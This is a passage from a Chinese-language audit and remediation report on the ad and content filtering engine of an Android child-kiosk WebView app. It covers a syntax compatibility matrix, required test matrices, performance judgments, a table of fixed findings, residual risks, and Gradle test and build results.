2. 使用 PSL/eTLD+1，修复来源优先级和 `$badfilter` canonicalization。
3. 采用线性 regex 引擎或严格 AST/预算；为订阅设置 selector/regex/总规则/总字节配额。
4. 单一化过滤开关，建立 generation/hash 跨进程快照，不再把规则正文塞入 Intent。
5. 增加过滤订阅 WorkManager 更新、ETag/Last-Modified/SHA、签名 manifest 和可回滚代际。
6. 管理页异步化，统一统计口径和生效反馈；主框架提供本地解释/家长恢复页。

### P2：体验和数据驱动性能优化

1. document-start 注入、SPA 动态 DOM 预算、site-specific cosmetic 优先和完整 CSS 分批。
2. compiled snapshot/mmap 可行性评估；先用基准确认冷启动、常驻内存和低端机 GC，再决定是否引入成熟 Native 引擎。
3. 热路径减少临时分配、分段 LRU、single-flight 和 query-sensitive rule partition。
4. 诊断默认脱敏、可复制完整原始日志的二次确认、订阅 provenance/trust UI。

## 5. 兼容能力矩阵

| 能力 | 当前状态 | 主要问题 | 建议对外表述 |
| --- | --- | --- | --- |
| hosts/domain-only | 部分可用 | parser 过宽，会吞 ABP | Partial，待严格 source mode |
| `||domain^` | 部分可用 | 简单纯 host 可用，path/wildcard/separator 错误 | Partial |
| `|url|` / `*` / `^` | 不可靠 | 双锚和 DOMAIN_ANCHOR 组合语义丢失 | Unsupported/Experimental |
| regex | 部分可用 | `$` 被误切 options；ReDoS 防护不足 | Experimental |
| resource options | 部分可用 | script/image 等基于启发式；iframe/fetch/ping/ws 缺口 | Partial，逐类型展示 |
| party/domain options | 部分可用 | domain 基本可用；party 缺完整 PSL | Partial |
| exceptions/important | 部分可用 | 没有家长 source tier | Partial |
| `badfilter` | 部分可用 | option 顺序/大小写敏感 | Partial |
| `removeparam` | **危险** | 会参与 BLOCK，且破坏 URL 编码 | 暂停/关闭 |
| cosmetic `##/#@#` | **危险** | CSS grammar 注入；配额/时机问题 | 仅可信规则，修复前关闭自定义源 |
| procedural cosmetic | 不支持且误降级 | `#?#/#@?#/#%#` 等污染 network | Unsupported，明确统计 |
| scriptlet | 安全方向正确、覆盖有限 | allowlist 有效；时机晚、未知 marker 降级 | Supported subset |
| popup | 基本无效 | 判断 opener，不是 target | Unsupported until fixed |
| Service Worker/WebSocket | 未覆盖 | 普通 WebViewClient/HTTP gate 无法覆盖 | Unsupported/platform-limited |

管理页建议不要再用一行“兼容 ABP/EasyList、uBO、AdGuard 常用语法”概括所有能力。应展示版本化兼容矩阵，并区分 `supported`、`partial`、`unsupported`、`ignored safely` 和 `dangerously disabled`。

## 6. 必补测试矩阵

### 6.1 Parser/engine JVM tests

- ABP：双端锚、domain path anchor、`*`/`^`、escaped separator、regex `$`、option 大小写/顺序。
- hosts：严格裸域、IPv4/IPv6、inline comment、多 alias、IDN、localhost；ABP token 永不被误吞。
- `removeparam`：不产生 BLOCK；GET/POST、例外、重复参数、空值、percent encoding、fragment、OAuth/签名 URL。
- precedence：站点临时放行、自定义例外、白名单一方保护、订阅例外、important、普通阻断的完整组合。
- `badfilter`：跨 source、option 重排/大小写、domain list canonicalization。
- party：`co.jp`、`github.io`、`appspot.com`、IDN、IPv4/IPv6、localhost。
- regex：已知 catastrophic patterns、数量预算、慢规则隔离。
- cosmetic/scriptlet：恶意 CSS、未知 marker、>800 条时 site rule 优先、完整分批、allowlist 参数边界。

### 6.2 Android/WebView instrumentation tests

- 超过 2048 字符的域名命中规则。
- iframe/subdocument、fetch/XHR、sendBeacon/ping、WebSocket、Service Worker fetch。
- `window.open`、`target=_blank`、用户手势、popup target 例外与 tab spam。
- document-start 竞态、SPA 动态 DOM、页面跳转/复用 WebView 后快照换代。
- engine build failure/cache eviction 时的 last-known-good 和 UI 降级状态。
- 主框架安全规则的本地解释页、家长验证与临时继续。
- Android 9-12 广播 sender 认证、超大/高频 event JSON。

### 6.3 Repository/integration tests

- 切换所有预设不丢自定义订阅和缓存文件。
- 下载中并发 switch/delete/add/preset，旧任务不能覆盖新 generation。
- 空 body、HTML、chunked 超限、规则数骤降、编译错误、磁盘中断均保留上一版。
- ETag/304、SHA/provenance、原子 rename、进程被杀后的恢复。
- 大自定义规则的 Binder 边界与 snapshot 文件换代。
- 单一 enabled 真值的旧版本迁移和崩溃一致性。

### 6.4 Differential/performance tests

- 从 EasyList、EasyPrivacy、AdGuard Chinese、AdGuard Mobile 抽取稳定 golden corpus，与官方期望或成熟引擎做差分。
- 四列表合并：构建时间、P50/P95/P99、候选数、regex 次数、cache churn、allocation/GC、常驻内存和冷启动。
- 真机至少覆盖低端 API 28、中端机和当前高版本 WebView；验收需求中的 decision P95 < 2ms、P99 < 5ms、常驻内存 < 50MB。
- indexed-vs-linear 只验证索引没有改变**当前** matcher 结果，不能证明 matcher 的 ABP 语义正确，必须与外部 oracle 配合。

## 7. 性能与架构判断

现有优化方向并非无效。Token/domain 索引已经显著缩小候选，历史真机报告的 decision P95 约 2ms；本次官方单列表桌面 JVM 抽样构建约 43-409ms，兜底列表约 3-17ms。当前最严重的用户风险来自语义错误、发布非原子和运行态 fail-open，而不是单次 matcher 还不够快。

因此不建议现在立刻以 JNI/Rust 重写作为第一优先级。先建立正确 AST、官方差分 corpus、稳定 snapshot 和低端真机 benchmark；如果四列表合并在 correctness 修复后仍无法满足 `<50MB`/P99，再比较 `adblock-rust`、RE2/J、预编译二进制索引或 mmap snapshot。否则重写只会把尚未定义清楚的错误语义固化到更复杂的边界里。

## 8. 已验证的正向设计

- 新启动网页的 Intent 已携带 runtime config snapshot；`WebViewActivity` 位于隔离 `:webview` 进程：`app/src/main/AndroidManifest.xml:64`。
- `onNewIntent()` 已重新解析 Intent 配置并替换 Activity 字段：`app/src/main/java/site/anzz/childkiosk/WebViewActivity.kt:1770`。本文没有沿用“完全忽略新配置”的旧结论。
- WebViewPool 按完整 runtime config key 复用，能避免明显不兼容的旧预加载实例。
- WebView 启动阶段预热 engine，请求热路径只读缓存，避免在 `shouldInterceptRequest` 内同步读盘/编译：`app/src/main/java/site/anzz/childkiosk/WebViewActivity.kt:1906`、`app/src/main/java/site/anzz/childkiosk/util/AdBlocker.kt:73`。
- Scriptlet 使用本地名称 allowlist、属性路径约束和 JSON quote；未知名称不执行：`app/src/main/java/site/anzz/childkiosk/util/filter/FilterRuleParser.kt:129`、`app/src/main/java/site/anzz/childkiosk/util/filter/FilterEngine.kt:645`。
- 已有 token/domain index、normalized/full cache、候选诊断和真实 `:webview` 进程性能快照，为后续回归提供了不错的可观测基础。
- 订阅要求 HTTPS、单文件设置 15MB 名义上限；API 33+ 日志 receiver 已使用 `RECEIVER_NOT_EXPORTED`。这些控制需要按 findings 加固，但方向正确。

## 9. 本次验证与残余风险

- 当前 `FilterEngineTest` 有 25 个 JVM 测试；现有测试覆盖基本规则、索引一致性、缓存、部分 regex/cosmetic/scriptlet 和静态扩展名类型推断。
- 报告完成后，以下定向测试已在最终工作区再次通过（`BUILD SUCCESSFUL`，25 个测试）：

  ```bash
  JAVA_HOME='/Applications/Android Studio.app/Contents/jbr/Contents/Home' \
  ./gradlew :app:testStandardDebugUnitTest \
  --tests 'site.anzz.childkiosk.util.filter.FilterEngineTest'
  ```

- 该结果只能证明现有断言通过；C-01 等缺陷恰好未被现有断言覆盖，不能据此推导规则语义正确或 WebView 集成已通过。
- 本次没有真机 WebView instrumentation、Service Worker/WebSocket、低端机内存或四列表合并正式 benchmark，因此平台覆盖和 `<50MB` 目标仍属于未验证风险。
- 官方列表粗扫数字会随上游变化；落地时应把固定 corpus 和期望结果纳入仓库，避免用在线列表的每日漂移判断回归。

---

**最终建议：**先完成 P0 并补齐对应回归测试，再开放 STRONG、远程 cosmetic 和“核心语法兼容”声明；P1 完成后再评估默认标准预设是否恢复四列表，以及是否有必要引入成熟 Native 过滤引擎。

## 10. 修复实施状态（2026-07-11）

### 10.1 结论更新

本次 remediation 已消除报告中的 Critical 与 P0 阻断项，结论更新为：

**P0 APPROVED；P1 平台覆盖仍需真机认证。**

这表示当前实现可以进入后续设备验收，但不等同于宣称完整支持所有 ABP/uBO/AdGuard 语法或所有 WebView 网络路径。管理页已改为“经验证的安全子集”，未支持语法按 unsupported 统计。

### 10.2 已完成

| 原 finding | 状态 | 落地结果 |
| --- | --- | --- |
| C-01 / H-07 | 已修复 | `$removeparam` 独立 transformation plane，不参与 BLOCK；保留 raw URL，限制主框架 GET，并跳过认证/签名 URL 与站点放行。 |
| C-02 / H-03 | 已修复 | 严格 selector policy；selector 只作为 JSON 数据进入 `querySelectorAll()`，stylesheet 只包含固定本地 class；未知 cosmetic/scriptlet family 安全计 unsupported。 |
| H-01 / H-02 | 已修复为安全子集 | 严格 hosts parser；独立 start/end/domain anchor；确定性 bounded wildcard/separator matcher；raw regex 明确 unsupported，不回退 Java backtracking regex。 |
| H-04 / H-06 | 已修复/诚实降级 | 长 URL 继续执行 domain-only 规则；使用 method、Accept、`Sec-Fetch-*` 推断可观测资源；Service Worker/WebSocket 平台缺口继续标为 partial/unsupported。 |
| H-05 | 已修复 | 弹窗在独立未注册 WebView 中等待首个真实 target，使用 target + opener + gesture 决策；阻断即销毁，允许后才注册 tab，并有 4 个并发和 10 秒超时上限。 |
| H-08 / H-09 / H-10 | 已修复 | 预设保留自定义订阅；更新使用 ID/URL/generation/identity CAS；15 MiB 流式下载、严格 UTF-8/HTML 拒绝、60 MiB 总预算、不可变 SHA-256 generation、metadata pointer 与 LKG。 |
| H-11 | 已修复 | Activity 持有强 engine handle，状态为 `PREPARING/READY/DEGRADED_LKG/DEGRADED_BUNDLED`；准备失败使用 LKG 或 bundled，不再由 LRU miss 静默 ALLOW。 |
| H-12 | 已修复 | 管理页后台加载引擎；自定义规则 400 ms debounce 校验，并在 UI 与 Repository 双层实施 128 KiB UTF-8 上限。 |
| M-01 / M-03 / M-04 | 已修复 | 使用 PSL/IDN/IP/localhost party classifier；家长自定义例外优先；`badfilter` 使用结构化 canonical key。 |
| M-09 / M-10 | 已修复 | `limit_ad_block` 成为权威开关并兼容迁移 legacy 值；站点 override 使用 longest-domain match，临时放行不再遗留永久 `networkDisabled=true`。 |
| M-12 / M-13 | 已修复 | 事件字段与 JSON 有界、速率限制；所有 API 使用 non-exported 动态 receiver。 |

最终安全复核又识别并修复了三类对抗边界：

- popup 对 `about:blank#fragment`、`data:`/`blob:`/`javascript:` 和 HTTP 重定向中间页保持 pending；只有最终 HTTP(S) commit 通过 `$popup` 决策后才注册。注册后继续携带 opener/gesture 上下文，后续 JS/meta/server redirect 仍按 POPUP 复核。
- pending popup 的 10 秒超时、阻断销毁、Activity teardown 和注册后 reload 使用 Activity 主线程 Handler、CAS 与可取消任务，避免 detached WebView RunQueue 泄漏和 destroy 后 reload。
- 网络 matcher 增加单规则复杂度、每阶段候选数、每决策候选数和字符步数上限；预算耗尽结构化记录并 fail-safe BLOCK，`removeparam` 耗尽时保持原 URL。selector 也增加静态成本、单页累计成本、节点数和后续查询启动时间上限。

代码质量、架构和最终安全复核结论均为 **APPROVE**，最终计数为 **CRITICAL 0 / HIGH 0**。

同时新增故障手册 `docs/runbooks/web_filtering_troubleshooting.md`，以及恶意 selector、长 URL、popup 和 Service Worker 的本地测试页。

### 10.3 延期与残余风险

- Service WorkerClient、WebSocket 完整覆盖、document-start/SPA observer、WorkManager 自动更新、ETag/Last-Modified 和签名 manifest 未纳入本轮；UI 不宣称完整支持。
- 未执行真实设备上的 WebView instrumentation、Android 9–14 广播对抗测试、四列表低端机 `<50 MB` 常驻内存和 P95/P99 性能认证。
- 主框架阻断的本地儿童友好解释页、诊断默认 query/token 脱敏、删除规则/订阅的家长确认仍属于后续体验与隐私增强。
- 允许 popup 当前先在隔离临时 WebView 解析最终目标，再由正式安全 client 重载；这会产生双 GET，并不保留 `target=_blank` POST 结果。取消重载需要“临时 WebView 原地晋升”的独立重构和真机验证。
- 单次浏览器原生 `querySelectorAll()` 无法由 JavaScript 强制中断；本轮用严格 selector 子集和总成本前置约束降低风险，仍需在低端真机大 DOM 上压测。
- raw regex 在引入线性时间引擎前保持 unsupported；这是安全取舍，不是兼容性完成。

### 10.4 验证记录

使用 JDK 17 在最终合并工作区执行：

```bash
./gradlew :app:testStandardDebugUnitTest :app:testEnhancedDebugUnitTest
./gradlew :app:assembleStandardDebug :app:assembleEnhancedDebug
```

两条命令均 `BUILD SUCCESSFUL`。最终 Standard 与 Enhanced 各执行 111 个 JVM 测试，均为 0 failure / 0 error / 0 skipped；其中过滤引擎专项 42 个，覆盖 parser/engine、matcher 对抗预算、Repository generation/CAS/配额、超长 URL、popup 中间跳转 gate、runtime timeout/LKG/bundled、selector 注入成本、receiver 验证和单一开关迁移。另执行 `git diff --check` 通过。
